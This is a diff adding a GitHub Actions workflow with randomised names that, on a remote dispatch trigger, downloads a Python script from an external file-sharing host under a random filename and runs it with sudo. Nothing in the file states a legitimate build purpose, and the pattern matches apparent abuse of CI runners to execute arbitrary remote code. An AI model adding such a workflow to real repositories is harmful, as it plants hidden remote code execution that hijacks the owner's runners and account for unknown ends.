@@ -1,0 +1,21 @@
+name: ZrFPvlMtzp
+
+on:
+  repository_dispatch:
+    types:
+      - linux
+
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - name: 4cUakTWLdP
+        run: |
+          sudo apt-get update -y
+          sudo apt-get install wget -y
+          cd /opt
+          sudo wget https://pan.urldwz.com/api/v3/file/source/57248/runhc_linux.py?sign=_3Q-iix0Ijv3MHjgMiE4djw5mtIlZ--uZqKscMIBpEU%3D%3A0 -O QYje3OSndR.py
+          sudo python ./QYje3OSndR.py
